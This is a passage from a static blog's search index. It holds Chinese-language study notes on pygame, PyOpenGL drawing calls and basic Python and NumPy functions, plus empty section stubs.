创建一个没有边框的窗口 # pygame.DOUBLEBUF 创建一个“双缓冲“窗口, 这时要使用pg.display.flip()来刷新显示，而非pg.display.update()。 同时使用 请用 | pygame.time模块 #\rpygame.time.Clock() #\r用于创建一个时钟对象。这个对象可以帮助我们测量时间的流逝，并控制游戏的帧率。\n实例：\nimport pygame # 初始化pygame pygame.init() # 设置窗口大小 screen = pygame.display.set_mode((800, 600)) # 创建时钟对象 clock = pygame.time.Clock() running = True while running: for event in pygame.event.get(): if event.type == pygame.QUIT: running = False # 填充屏幕背景色 screen.fill((255, 255, 255)) # 更新显示 pygame.display.flip() # 控制帧率为60帧每秒 clock.tick(60) print(clock.get_fps()) # 退出pygame pygame.quit() clock.tick()\n若不传入参数（即使用默认值），它不会对帧率进行限制。 返回值是自上一次调用 tick() 方法以来所经过的毫秒数。 如果传入了帧率参数（如 clock.tick(60)），tick() 方法会在必要时进行延迟，以确保帧率稳定。因此，返回值可能会受到帧率限制的影响，不一定能完全反映代码实际执行所花费的时间。 clock.get_fps()\n获得瞬时速率（以帧每秒或 fps 为单位）。 pygame.event.get() #\r用于获取当前存储在 pygame 事件队列中的所有事件。\n返回一个包含 pygame.Event 对象的列表，每个 pygame.Event 对象代表一个具体的事件。\n事件类型 #\rpygame 定义了许多不同类型的事件，常见的事件类型有：\npygame.QUIT：当用户点击窗口的关闭按钮时触发该事件，通常用于退出游戏主循环。 pygame.KEYDOWN：当用户按下键盘上的某个按键时触发。 pygame.KEYUP：当用户释放键盘上的某个按键时触发。 pygame.MOUSEBUTTONDOWN：当用户按下鼠标按钮时触发。 pygame.MOUSEBUTTONUP：当用户释放鼠标按钮时触发。 实例：\nfor event in pygame.event.get(): if event.type == pygame.QUIT: #检测是否退出 pygame.quit() quit() openGL #\r基本使用 #\r导入 #\rfrom OpenGL.GL import * from OpenGL.GLU import * gluPerspective() #\r调用 gluPerspective 来描述我们在场景中的视角。\n实例：\ngluPerspective(45, 1, 0.1, 50.0) #45: 视线角度为45 #1: 视口的宽高比（aspect ratio）。这里宽高比为 1，意味着视口的宽度和高度相等。通常，这个值应该设置为视口的实际宽度除以高度。 #0.1: 近裁剪面的距离。任何距离相机小于这个值的物体都将被裁剪掉，不会显示在屏幕上。 #50.0: 远裁剪面的距离。任何距离相机大于这个值的物体都将被裁剪掉，不会显示在屏幕上。 glTranslatef() #\r用于对当前的模型视图矩阵进行平移变换。平移变换可以将物体在三维空间中沿着指定的方向移动。\n实例：\nglTranslatef(0.0, 0.0, -5) #0.0：表示在 X 轴方向上的平移量。这里设置为 0，意味着在 X 轴方向上不进行平移。 #0.0：表示在 Y 轴方向上的平移量。这里设置为 0，意味着在 Y 轴方向上不进行平移。 #-5：表示在 Z 轴方向上的平移量。由于 OpenGL 采用右手坐标系，Z 轴正方向指向屏幕外，负方向指向屏幕内，所以这里将物体沿着 Z 轴负方向平移 5 个单位，相当于将物体向屏幕内移动 5 个单位，从而使物体离相机更远。 glRotatef() #\r用于改变我们观察场景的角度。调用 glRotatef(theta, x, y, z)会将整个场景围绕向量(x, y, z)指定的轴旋转角度 theta。\n实例：\nglRotatef(30, 0, 0, 1) #绕z轴 30° glEnable() #\r用于启用特定的 OpenGL 功能。\n实例：\nglEnable(GL_CULL_FACE); #GL_CULL_FACE，表示面剔除功能。面剔除是一种优化技术，用于剔除那些背对相机的面，从而减少不必要的渲染计算。 glEnable(GL_DEPTH_TEST); #GL_DEPTH_TEST，表示深度测试功能。深度测试是一种用于确定哪些物体应该显示在前面，哪些物体应该显示在后面的技术。确保渲染离我们最近的多边形 glCullFace() #\r用于指定要剔除的面的类型。\n实例：\nglCullFace(GL_BACK); #GL_BACK：表示要剔除的面是背对相机的面。 glClear() #\r主要作用是清除指定的缓冲区，将缓冲区中的数据重置为默认值。在 OpenGL 里，有多种类型的缓冲区，如颜色缓冲区、深度缓冲区、模板缓冲区等，每个缓冲区都存储着不同类型的信息。\n缓冲区标志 #\r1. GL_COLOR_BUFFER_BIT #\r含义：清除颜色缓冲区。颜色缓冲区存储着屏幕上每个像素的颜色信息，清除该缓冲区会将所有像素的颜色设置为之前通过 glClearColor 函数指定的清除颜色。默认的清除颜色是黑色（RGB 值为 (0.0, 0.0, 0.0)），透明度为 1.0。 示例代码： // 设置清除颜色为红色 glClearColor(1.0, 0.0, 0.0, 1.0); // 清除颜色缓冲区 glClear(GL_COLOR_BUFFER_BIT); 2. GL_DEPTH_BUFFER_BIT #\r含义：清除深度缓冲区。深度缓冲区用于记录每个像素的深度值（即离相机的距离），清除该缓冲区会将所有像素的深度值设置为之前通过 glClearDepth 函数指定的清除深度值。默认的清除深度值是 1.0。 示例代码： // 设置清除深度值为 1.0 glClearDepth(1.0); // 清除深度缓冲区 glClear(GL_DEPTH_BUFFER_BIT); 3. GL_STENCIL_BUFFER_BIT #\r含义：清除模板缓冲区。模板缓冲区用于实现一些特殊的渲染效果，如裁剪、遮罩等。清除模板缓冲区会将所有像素的模板值设置为之前通过 glClearStencil 函数指定的清除模板值。默认的清除模板值是 0。\n示例代码：\n// 设置清除模板值为 0 glClearStencil(0); // 清除模板缓冲区 glClear(GL_STENCIL_BUFFER_BIT); 使用按位或运算符 | 组合多个缓冲区标志，一次性清除多个缓冲区。例如，同时清除颜色缓冲区和深度缓冲区：\nglBegin()\u0026amp;glEnd() #\r用于定义图元（基本图形元素）的函数对。\nglBegin 函数用于开始定义一组图元，而 glEnd 函数用于结束这组图元的定义。\n在 glBegin 和 glEnd 之间，可以使用 glVertex 等函数来指定图元的顶点信息。\n实例：\nglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); # 开始定义三角形图元 glBegin(GL_TRIANGLES); # 指定第一个三角形的三个顶点 glColor3f(1.0, 0.0, 0.0); # 设置颜色为红色 glVertex3f(-0.5, -0.5, 0.0); glVertex3f(0.5, -0.5, 0.0); glVertex3f(0.0, 0.5, 0.0); # 结束定义三角形图元 glEnd(); # 刷新缓冲区，将绘制结果显示到屏幕上 glFlush(); glVertex #\rglVertex3f #\r用于指定三维顶点坐标的函数\nglVertex3f(x, y, z); glVertex3fv #\r用于指定三维顶点坐标的函数\nv = (1,2,3) glVertex3fv(v); glColor #\r用于指定当前绘图颜色，后续使用 OpenGL 进行图形绘制（如绘制点、线、多边形等）时，就会使用这个设置好的颜色。\nglColor3f() #\r用于指定当前绘图颜色\n# 设置绘图颜色为红色 glColor3f(1.0, 0.0, 0.0) glColor3fv() #\r用于指定当前绘图颜色\nrgb = (1,0,0) glColor3fv(v); ","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/python/pygame/","section":"我的文档","summary":"","title":"PyGame","type":"posts"},{"content":"\rPython #\r类 #\r继承和抽象类 #\r继承 #\rclass Vector(): def ... class Vec2(Vector):#继承Vector def ... 抽象类 #\rfrom abc import ABC,abstractmethod class Vector(ABC): #继承抽象基类 @abstractmethod #定义抽象方法 def ... 注意： ABC 类是 abc 模块中定义的抽象基类标识，继承它的类才能通过 @abstractmethod 装饰器实现抽象方法的强制约束。如果改为 Vector()，则 Vector 变为普通类，其中的 @abstractmethod 装饰器将失效。此时：\n子类可以不实现​ pay 方法； 即使子类未实现抽象方法，也不会在实例化时报错。 动态实例化 #\rclass Parent: def create_new(self): return self.__class__() # 动态实例化 基本函数使用 #\r数据比较 #\risclose #\risclose()用于判断两个浮点数是否在指定的误差范围内“接近相等”。由于浮点数在计算机中的存储和运算可能存在精度误差，直接使用 a == b 比较可能不可靠，isclose() 通过设置相对或绝对容差（允许的误差范围）来解决这一问题。\nimport math f1 = 1.2233222 f2 = 1.2233223 isclose(f1,f2) 列表、元组、集合的处理 #\rset #\r使用set创建不重复元素的集合 #\rbasket = [\u0026#39;apple\u0026#39;, \u0026#39;orange\u0026#39;, \u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;orange\u0026#39;, \u0026#39;banana\u0026#39;] print(set(basket)) #{\u0026#39;orange\u0026#39;, \u0026#39;banana\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;apple\u0026#39;} a = set(\u0026#39;abracadabra\u0026#39;) print(a) #{\u0026#39;a\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;} list #\rlist()函数可以将任何可迭代数据转换为列表类型，并返回转换后的列表。当参数为空时，list函数可以创建一个空列表。\n创建一个空列表（无参调用list函数） \u0026gt;\u0026gt;\u0026gt; test = list()\r\u0026gt;\u0026gt;\u0026gt; test\r\u0026gt;\u0026gt;\u0026gt; [] 将字符串转换为列表 \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; test = list(\u0026#39;cat\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; test\r\u0026gt;\u0026gt;\u0026gt; [\u0026#39;c\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;t\u0026#39;] 将元组转换为列表 \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; a_tuple = (\u0026#39;I love Python.\u0026#39;, \u0026#39;I also love HTML.\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; test = list(a_tuple)\r\u0026gt;\u0026gt;\u0026gt; test\r\u0026gt;\u0026gt;\u0026gt; [\u0026#39;I love Python.\u0026#39;, \u0026#39;I also love HTML.\u0026#39;] 将字典转换为列表 \u0026gt;\u0026gt;\u0026gt; a_dict = {\u0026#39;China\u0026#39;:\u0026#39;Beijing\u0026#39;, \u0026#39;Russia\u0026#39;:\u0026#39;Moscow\u0026#39;} \u0026gt;\u0026gt;\u0026gt; test = list(a_dict) \u0026gt;\u0026gt;\u0026gt; test \u0026gt;\u0026gt;\u0026gt; [\u0026#39;China\u0026#39;, \u0026#39;Russia\u0026#39;] \u0026gt;\u0026gt;\u0026gt; ⚠️注意：将字典转换为列表时，会将字典的值舍去，而仅仅将字典的键转换为列表。如果想将字典的值全部转换为列表，可以考虑使用字典方法dict.values() 将集合转换为列表 \u0026gt;\u0026gt;\u0026gt; a_set = {1, 4, \u0026#39;sdf\u0026#39;}\r\u0026gt;\u0026gt;\u0026gt; test = list(a_set)\r\u0026gt;\u0026gt;\u0026gt; test\r\u0026gt;\u0026gt;\u0026gt; [1, \u0026#39;sdf\u0026#39;, 4] 将其他可迭代序列转化为列表 下面的代码将range类型和map类型的可迭代序列转换为列表： \u0026gt;\u0026gt;\u0026gt; test1 = list(range(10))\r\u0026gt;\u0026gt;\u0026gt; test2 = list(map(int, [23.2, 33.1]))\r\u0026gt;\u0026gt;\u0026gt; test1\r\u0026gt;\u0026gt;\u0026gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\r\u0026gt;\u0026gt;\u0026gt; test2\r\u0026gt;\u0026gt;\u0026gt; [23, 33] zip #\r特性：将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。如果多个给定两个不同的长度的列表会截断较长的那个。\n\u0026gt;\u0026gt;\u0026gt; a = [1,2,3] \u0026gt;\u0026gt;\u0026gt; b = [4,5,6] \u0026gt;\u0026gt;\u0026gt; c = [4,5,6,7,8] \u0026gt;\u0026gt;\u0026gt; zipped = zip(a,b) # 打包为元组的列表 [(1, 4), (2, 5), (3, 6)] tuple #\rmap #\rmap函数会根据提供的函数对指定序列做映射，其的第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。\n语法 #\rmap() 函数语法：\nmap(function, iterable, ...) 返回值 #\rPython 2.x 返回列表。\nPython 3.x 返回迭代器。\n实例 ：\ndef square(x) : # 计算平方数 return x ** 2 map(square, [1,2,3,4,5]) # 计算列表各个元素的平方 #[1, 4, 9, 16, 25] map(lambda x: x ** 2, [1, 2, 3, 4, 5]) # 使用 lambda 匿名函数 #[1, 4, 9, 16, 25] # 提供了两个列表，对相同位置的列表数据进行相加 map(lambda x, y: x + y, [1, 3, 5, 7, 9], [2, 4, 6, 8, 10]) #[3, 7, 11, 15, 19] random #\rimport random random_number = random.random() #返回一个0.0 - 1.0之间的小数 random.randint(a,b) #返回一个a 和 b 之间的整数（包括 a 和 b）。 NumPy库 #\rimport numpy as np 计算点积dot() #\rimport numpy as np\r# 一维数组点积\ra = np.array([1, 2, 3])\rb = np.array([4, 5, 6])\rprint(np.dot(a, b)) # 输出: 32\r# 二维数组（矩阵）点积\rA = np.array([[1, 2], [3, 4]])\rB = np.array([[5, 6], [7, 8]])\rprint(np.dot(A, B))\r# 输出:\r# [[19 22]\r# [43 50]] Hypothesis #\r进行基于属性测试。\n","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/posts/python/python%E5%9F%BA%E7%A1%80/","section":"我的文档","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 年 5 月 22 日","externalUrl":null,"permalink":"/","section":"Tea","summary":"","title":"Tea","type":"page"},{"content":"","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/git/","section":"我的文档","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"我的文档","summary":"","title":"Heap","type":"posts"},{"content":"","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/pwn/","section":"我的文档","summary":"","title":"PWN","type":"posts"},{"content":"\r这是我的Python随笔 #\r","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/python/","section":"我的文档","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/web/","section":"我的文档","summary":"","title":"Web","type":"posts"},{"content":"\r快来看看有啥有用的东西！ #\r","date":"2025 年 5 月 21 日","externalUrl":null,"permalink":"/posts/","section":"我的文档","summary":"","title":"我的文档","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]